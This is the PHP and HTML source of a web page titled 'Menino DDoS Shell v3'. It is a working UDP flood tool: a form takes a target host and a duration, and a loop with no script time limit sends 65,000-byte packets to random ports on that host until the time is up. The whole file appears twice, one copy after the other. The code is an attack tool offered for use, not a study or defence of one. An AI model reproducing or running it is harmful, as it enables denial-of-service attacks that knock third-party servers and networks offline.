<html>
<head>
	<title>Menino DDoS Shell v3</title>
	<meta charset="utf-8">
	<style type="text/css">
		body {
		background-image: url(http://wallpoper.com/images/00/42/43/48/uchiha-sasuke_00424348.jpg); 
			font-family: "Trebuchet MS";
			color: #000;
		}
		input[type="text"] {
			background-color: #ccc;
			border:1px solid #ccc;
			border-radius: 0;
			width: 250px;
			height: 30px;
		}
		input[type="submit"] {
			background-color: #ccc;
			border:1px solid #ccc;
			border-radius: 0;
			width: 250px;
			height: 30px;
		}
	</style>
</head>
<body>
	<center>
		<form method="post" action="">
			<h1>DDoS Shell by K3N1</h1>
			<input type="text" name="host" placeholder="Host">
			<br />
			<input type="text" name="time" placeholder="Time">
			<br />
			<input type="submit" value="Attack!">
			<br />
			<?php 
				if(isset($_POST['host']) and isset($_POST['time'])) {
					$pacotes = 0;

					set_time_limit(0);

					$tempo=time();
					$tempo_maximo=$tempo+$_POST['time'];

					$host=htmlspecialchars($_POST['host']);
					for ($i=0; $i < 65000; $i++) { 
						$out .= 'X';
					}
					while(1) {
						$pacotes++;
						if(time() > $tempo_maximo) {
							break;
						}
						$gerar = rand(1,65000);
						$abrir=fsockopen("udp://".$host,$gerar,$errno,$errstr,5);
						if($abrir) {
							fwrite($abrir, $out);
							fclose($abrir);
						}
					}
					echo "Ataque finalizado!";
				}
			?>
		</form>
		<embed height="1" src="https://www.youtube.com/v/OQTImQ0RQNg?autoplay=1&start=30" type="application/x-shockwave-flash" width="1" wmode="transparent"></embed> 
	</center>
</body>
</html><html>
<head>
	<title>Menino DDoS Shell v3</title>
	<meta charset="utf-8">
	<style type="text/css">
		body {
		background-image: url(http://wallpoper.com/images/00/42/43/48/uchiha-sasuke_00424348.jpg); 
			font-family: "Trebuchet MS";
			color: #000;
		}
		input[type="text"] {
			background-color: #ccc;
			border:1px solid #ccc;
			border-radius: 0;
			width: 250px;
			height: 30px;
		}
		input[type="submit"] {
			background-color: #ccc;
			border:1px solid #ccc;
			border-radius: 0;
			width: 250px;
			height: 30px;
		}
	</style>
</head>
<body>
	<center>
		<form method="post" action="">
			<h1>DDoS Shell by K3N1</h1>
			<input type="text" name="host" placeholder="Host">
			<br />
			<input type="text" name="time" placeholder="Time">
			<br />
			<input type="submit" value="Attack!">
			<br />
			<?php 
				if(isset($_POST['host']) and isset($_POST['time'])) {
					$pacotes = 0;

					set_time_limit(0);

					$tempo=time();
					$tempo_maximo=$tempo+$_POST['time'];

					$host=htmlspecialchars($_POST['host']);
					for ($i=0; $i < 65000; $i++) { 
						$out .= 'X';
					}
					while(1) {
						$pacotes++;
						if(time() > $tempo_maximo) {
							break;
						}
						$gerar = rand(1,65000);
						$abrir=fsockopen("udp://".$host,$gerar,$errno,$errstr,5);
						if($abrir) {
							fwrite($abrir, $out);
							fclose($abrir);
						}
					}
					echo "Ataque finalizado!";
				}
			?>
		</form>
		<embed height="1" src="https://www.youtube.com/v/OQTImQ0RQNg?autoplay=1&start=30" type="application/x-shockwave-flash" width="1" wmode="transparent"></embed> 
	</center>
</body>
</html>
